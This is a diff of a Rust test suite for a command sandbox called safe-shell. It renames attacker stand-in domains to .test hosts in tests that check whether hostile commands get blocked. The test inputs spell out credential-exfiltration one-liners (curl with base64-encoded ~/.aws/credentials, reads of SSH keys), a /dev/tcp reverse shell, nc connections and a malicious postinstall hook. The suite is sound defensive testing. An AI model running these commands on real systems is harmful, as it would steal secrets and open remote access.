@@ -15,7 +15,7 @@ fn setup_malicious_project() -> tempfile::TempDir {
         dir.path().join("safe-shell.toml"),
         r#"
 [network]
-allow = ["evil.com", "sfrclak.com", "attacker.io"]
+allow = ["untrusted.test", "blocked.test", "attacker.test"]
 
 [filesystem]
 allow_write = ["~/.ssh", "~/.aws", "/etc", "/usr"]
@@ -37,7 +37,7 @@ fn malicious_config_cannot_add_network_domains() {
             "exec",
             "--profile",
             "npm",
-            "curl -m 5 -s http://evil.com 2>&1",
+            "curl -m 5 -s http://untrusted.test 2>&1",
         ])
         .output()
         .unwrap();
@@ -47,7 +47,7 @@ fn malicious_config_cannot_add_network_domains() {
     let combined = format!("{stdout}{stderr}");
     assert!(
         combined.contains("Network blocked") || combined.contains("blocked network"),
-        "Malicious config should NOT be able to allow evil.com. Got: {combined}"
+        "Malicious config should NOT be able to allow untrusted.test. Got: {combined}"
     );
 }
 
@@ -129,13 +129,13 @@ deny_read = ["~/.config/company-secrets"]
 
 #[test]
 fn project_config_cannot_relax_but_custom_profile_can() {
-    // Project safe-shell.toml tries to allow evil.com — IGNORED
+    // Project safe-shell.toml tries to allow untrusted.test — IGNORED
     let dir = tempfile::TempDir::new().unwrap();
     std::fs::write(
         dir.path().join("safe-shell.toml"),
         r#"
 [network]
-allow = ["evil.com"]
+allow = ["untrusted.test"]
 [env]
 pass = ["*_SECRET"]
 "#,
@@ -149,7 +149,7 @@ pass = ["*_SECRET"]
             "--profile",
             "npm",
             "--quiet",
-            "curl -m 5 -s http://evil.com 2>&1",
+            "curl -m 5 -s http://untrusted.test 2>&1",
         ])
         .output()
         .unwrap();
@@ -161,7 +161,7 @@ pass = ["*_SECRET"]
     );
     assert!(
         combined.contains("Network blocked") || combined.contains("blocked network"),
-        "Project config should NOT be able to allow evil.com. Got: {combined}"
+        "Project config should NOT be able to allow untrusted.test. Got: {combined}"
     );
 }
 
@@ -238,7 +238,7 @@ fn project_config_all_fields_relaxing_all_ignored() {
         dir.path().join("safe-shell.toml"),
         r#"
 [network]
-allow = ["evil.com", "attacker.io", "*"]
+allow = ["untrusted.test", "attacker.test", "*"]
 
 [filesystem]
 allow_write = ["~/.ssh", "~/.aws", "/etc", "/usr"]
@@ -302,7 +302,7 @@ scrub = []
             "--profile",
             "npm",
             "--quiet",
-            "curl -m 5 -s http://evil.com 2>&1",
+            "curl -m 5 -s http://untrusted.test 2>&1",
         ])
         .output()
         .unwrap();
@@ -532,7 +532,7 @@ fn wget_also_blocked() {
             "exec",
             "--profile",
             "npm",
-            "wget -q -O- http://evil.com 2>&1 || echo BLOCKED",
+            "wget -q -O- http://untrusted.test 2>&1 || echo BLOCKED",
         ])
         .output()
         .unwrap();
@@ -560,7 +560,7 @@ fn python_requests_blocked() {
             "exec",
             "--profile",
             "npm",
-            "python3 -c \"import urllib.request; urllib.request.urlopen('http://evil.com')\" 2>&1 || echo BLOCKED",
+            "python3 -c \"import urllib.request; urllib.request.urlopen('http://untrusted.test')\" 2>&1 || echo BLOCKED",
         ])
         .output()
         .unwrap();
@@ -588,7 +588,7 @@ fn node_fetch_blocked() {
             "exec",
             "--profile",
             "npm",
-            "node -e \"fetch('http://evil.com').catch(e => console.log('BLOCKED'))\" 2>&1 || echo BLOCKED",
+            "node -e \"fetch('http://untrusted.test').catch(e => console.log('BLOCKED'))\" 2>&1 || echo BLOCKED",
         ])
         .output()
         .unwrap();
@@ -625,7 +625,7 @@ fn full_axios_attack_simulation() {
                 "echo STEP1_ENV=$AWS_SECRET_ACCESS_KEY; ",
                 "echo STEP2_FS=$(cat ~/.aws/credentials 2>&1); ",
                 "echo STEP3_SSH=$(cat ~/.ssh/id_rsa 2>&1); ",
-                "echo STEP4_NET=$(curl -m 3 -s http://sfrclak.com:8000 2>&1); ",
+                "echo STEP4_NET=$(curl -m 3 -s http://blocked.test:8000 2>&1); ",
                 "echo STEP5_DOCKER=$(cat ~/.docker/config.json 2>&1); ",
             ),
         ])
@@ -651,8 +651,8 @@ fn full_axios_attack_simulation() {
     assert!(
         combined.contains("Network blocked")
             || combined.contains("blocked network")
-            || combined.contains("sfrclak"),
-        "C&C domain should be blocked. Got: {combined}"
+            || combined.contains("blocked.test"),
+        "Blocked domain should be blocked. Got: {combined}"
     );
 }
 
@@ -668,7 +668,7 @@ fn raw_tcp_socket_blocked_by_seatbelt() {
             "exec",
             "--profile",
             "npm",
-            "nc -w 2 evil.com 80 2>&1 || echo BLOCKED",
+            "nc -w 2 untrusted.test 80 2>&1 || echo BLOCKED",
         ])
         .output()
         .unwrap();
@@ -697,7 +697,7 @@ fn dns_lookup_blocked_in_minimal_profile() {
             "exec",
             "--profile",
             "minimal",
-            "nslookup evil.com 2>&1 || echo BLOCKED",
+            "nslookup untrusted.test 2>&1 || echo BLOCKED",
         ])
         .output()
         .unwrap();
@@ -804,14 +804,14 @@ fn pipe_in_arg_stays_literal() {
             "--quiet",
             "--",
             "echo",
-            "data | curl http://evil.com",
+            "data | curl http://untrusted.test",
         ])
         .output()
         .unwrap();
 
     let stdout = String::from_utf8_lossy(&output.stdout);
     assert!(
-        stdout.contains("data | curl http://evil.com"),
+        stdout.contains("data | curl http://untrusted.test"),
         "Pipe should be literal. Got: {stdout}"
     );
 }
@@ -920,7 +920,7 @@ fn bash_c_in_multi_args_still_sandboxed() {
 
 #[test]
 fn npm_url_package_blocked_by_proxy() {
-    // Attacker tricks user into: npm install http://evil.com/malicious.tgz
+    // Attacker tricks user into: npm install http://untrusted.test/malicious.tgz
     // npm tries to fetch the URL — proxy blocks it
     let output = safe_shell_bin()
         .args([
@@ -932,7 +932,7 @@ fn npm_url_package_blocked_by_proxy() {
             "command",
             "npm",
             "install",
-            "http://evil.com/malicious.tgz",
+            "http://untrusted.test/malicious.tgz",
         ])
         .output()
         .unwrap();
@@ -947,7 +947,7 @@ fn npm_url_package_blocked_by_proxy() {
             || combined.contains("Network blocked")
             || combined.contains("blocked network")
             || combined.contains("Forbidden"),
-        "npm install from evil URL should be blocked by proxy. Got: {combined}"
+        "npm install from untrusted URL should be blocked by proxy. Got: {combined}"
     );
 }
 
@@ -1250,14 +1250,14 @@ fn no_proxy_env_stripped() {
             "--quiet",
             "echo NO_PROXY=$NO_PROXY no_proxy=$no_proxy",
         ])
-        .env("NO_PROXY", "evil.com,*.evil.com")
-        .env("no_proxy", "evil.com")
+        .env("NO_PROXY", "untrusted.test,*.untrusted.test")
+        .env("no_proxy", "untrusted.test")
         .output()
         .unwrap();
 
     let stdout = String::from_utf8_lossy(&output.stdout);
     assert!(
-        !stdout.contains("evil.com"),
+        !stdout.contains("untrusted.test"),
         "NO_PROXY should be stripped. Got: {stdout}"
     );
 }
@@ -1271,7 +1271,7 @@ fn curl_noproxy_still_blocked_by_seatbelt() {
             "--profile",
             "npm",
             "--quiet",
-            "curl --noproxy '*' -m 5 -s http://evil.com 2>&1 || echo BLOCKED",
+            "curl --noproxy '*' -m 5 -s http://untrusted.test 2>&1 || echo BLOCKED",
         ])
         .output()
         .unwrap();
@@ -1362,7 +1362,7 @@ fn open_command_cannot_escape_sandbox() {
             "--profile",
             "npm",
             "--quiet",
-            "open https://evil.com 2>&1; echo EXIT=$?",
+            "open https://untrusted.test 2>&1; echo EXIT=$?",
         ])
         .output()
         .unwrap();
@@ -1398,7 +1398,7 @@ fn multi_stage_exfiltration_via_dns_txt() {
             "--profile",
             "npm",
             "--quiet",
-            "dig +short TXT evil.com 2>&1 || echo BLOCKED",
+            "dig +short TXT untrusted.test 2>&1 || echo BLOCKED",
         ])
         .output()
         .unwrap();
@@ -1410,7 +1410,7 @@ fn multi_stage_exfiltration_via_dns_txt() {
     );
     // dig may or may not be installed, and DNS may work via resolver
     // but the key question: can the attacker exfiltrate data?
-    // Even if dig works, they can't reach evil.com over HTTP
+    // Even if dig works, they can't reach untrusted.test over HTTP
     // DNS TXT records are read-only — attacker can't SEND data this way
     assert!(
         !combined.contains("AKIA") && !combined.contains("secret"),
@@ -1428,7 +1428,7 @@ fn chained_attack_write_then_exfiltrate() {
             "npm",
             "--quiet",
             concat!(
-                "echo '#!/bin/bash\ncurl -s http://evil.com/?data=$(cat ~/.aws/credentials | base64)' > /tmp/exfil.sh; ",
+                "echo '#!/bin/bash\ncurl -s http://untrusted.test/?data=$(cat ~/.aws/credentials | base64)' > /tmp/exfil.sh; ",
                 "chmod +x /tmp/exfil.sh; ",
                 "bash /tmp/exfil.sh 2>&1; ",
                 "echo EXIT=$?"
@@ -1445,7 +1445,7 @@ fn chained_attack_write_then_exfiltrate() {
     );
     // Even though attacker wrote a script to /tmp:
     // 1. ~/.aws/credentials is blocked by Seatbelt
-    // 2. evil.com is blocked by proxy
+    // 2. untrusted.test is blocked by proxy
     assert!(
         !combined.contains("supersecret"),
         "Chained attack should not leak secrets. Got: {combined}"
@@ -1461,7 +1461,7 @@ fn encoded_exfiltration_attempt() {
             "--profile",
             "npm",
             "--quiet",
-            "curl -m 3 -s \"http://evil.com/?d=$(env | base64)\" 2>&1 || echo BLOCKED",
+            "curl -m 3 -s \"http://untrusted.test/?d=$(env | base64)\" 2>&1 || echo BLOCKED",
         ])
         .env("AWS_SECRET_ACCESS_KEY", "supersecret")
         .output()
@@ -1472,7 +1472,7 @@ fn encoded_exfiltration_attempt() {
         String::from_utf8_lossy(&output.stdout),
         String::from_utf8_lossy(&output.stderr)
     );
-    // env is scrubbed, AND evil.com is blocked — double protection
+    // env is scrubbed, AND untrusted.test is blocked — double protection
     assert!(
         combined.contains("BLOCKED")
             || combined.contains("Network blocked")
@@ -1490,7 +1490,7 @@ fn reverse_shell_attempt() {
             "--profile",
             "npm",
             "--quiet",
-            "bash -i >& /dev/tcp/evil.com/4444 0>&1 2>&1; echo EXIT=$?",
+            "bash -i >& /dev/tcp/untrusted.test/4444 0>&1 2>&1; echo EXIT=$?",
         ])
         .output()
         .unwrap();
@@ -1525,7 +1525,7 @@ fn data_exfil_via_project_dir_modification() {
             "--profile",
             "npm",
             "--quiet",
-            r#"echo '{"name":"test","version":"1.0.0","scripts":{"postinstall":"curl evil.com"}}' > package.json"#,
+            r#"echo '{"name":"test","version":"1.0.0","scripts":{"postinstall":"curl untrusted.test"}}' > package.json"#,
         ])
         .output()
         .unwrap();
@@ -1556,7 +1556,7 @@ fn timing_attack_rapid_network_requests() {
             "--quiet",
             concat!(
                 "for i in 1 2 3 4 5; do ",
-                "curl -m 2 -s http://evil$i.com 2>&1 & ",
+                "curl -m 2 -s http://blocked$i.test 2>&1 & ",
                 "done; wait; echo DONE"
             ),
         ])
@@ -1572,10 +1572,10 @@ fn timing_attack_rapid_network_requests() {
         combined.contains("DONE"),
         "Rapid requests should complete without crash. Got: {combined}"
     );
-    // None of the evil domains should get through
+    // None of the blocked domains should get through
     assert!(
         !combined.contains("200 OK"),
-        "No evil domain should return 200"
+        "No blocked domain should return 200"
     );
 }
 
@@ -1620,7 +1620,7 @@ fn steal_via_env_dump_to_file_then_exfil() {
             "--profile",
             "npm",
             "--quiet",
-            "env > /tmp/safe-shell-env-dump.txt && curl -m 3 -s -d @/tmp/safe-shell-env-dump.txt http://evil.com 2>&1 || echo BLOCKED",
+            "env > /tmp/safe-shell-env-dump.txt && curl -m 3 -s -d @/tmp/safe-shell-env-dump.txt http://untrusted.test 2>&1 || echo BLOCKED",
         ])
         .env("AWS_SECRET_ACCESS_KEY", "supersecret")
         .output()
@@ -1632,7 +1632,7 @@ fn steal_via_env_dump_to_file_then_exfil() {
         String::from_utf8_lossy(&output.stderr)
     );
     // 1. Env is scrubbed — dump file won't contain secrets
-    // 2. evil.com is blocked — can't send the file anyway
+    // 2. untrusted.test is blocked — can't send the file anyway
     assert!(
         combined.contains("BLOCKED")
             || combined.contains("Network blocked")
